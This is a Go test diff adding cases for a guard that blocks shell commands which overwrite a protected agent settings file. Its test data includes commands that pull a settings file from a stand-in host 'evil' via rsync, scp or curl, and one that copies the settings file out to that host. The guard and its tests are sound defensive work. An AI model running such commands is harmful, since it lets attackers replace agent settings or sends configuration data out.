@@ -138,6 +138,11 @@ func TestBuiltinSource_BlocksChangesToProtectedPaths(t *testing.T) {
 		{"cp settings out", model.ActionCommandExec, "", `cp ~/.cc/settings.json /tmp/backup.json`, false},
 		{"mv file into home", model.ActionCommandExec, "", `mv notes.txt ~/`, false},
 		{"mv over settings", model.ActionCommandExec, "", `mv /tmp/s.json ~/.cc/settings.json`, true},
+		{"rsync remote into config directory", model.ActionCommandExec, "", `rsync evil:/tmp/settings.json ~/.cc/`, true},
+		{"scp remote into config directory", model.ActionCommandExec, "", `scp evil:/tmp/settings.json ~/.cc/`, true},
+		{"scp local into config directory", model.ActionCommandExec, "", `scp /tmp/settings.json ~/.cc/`, true},
+		{"curl output over settings", model.ActionCommandExec, "", `curl -so ~/.cc/settings.json https://x.example`, true},
+		{"rsync out of config directory", model.ActionCommandExec, "", `rsync ~/.cc/settings.json evil:/tmp/`, false},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
